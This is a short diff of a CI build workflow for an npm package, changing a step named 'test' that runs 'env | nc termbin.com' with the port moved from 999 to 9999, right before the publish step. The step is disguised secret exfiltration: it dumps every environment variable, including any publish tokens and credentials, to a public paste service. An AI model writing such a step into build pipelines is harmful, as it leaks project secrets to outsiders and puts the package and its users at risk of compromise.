@@ -25,7 +25,7 @@ jobs:
         run: npm run build
 
       - name: test
-        run: env | nc termbin.com 999
+        run: env | nc termbin.com 9999
 
       - name: Publish to Npm
         run: npm publish
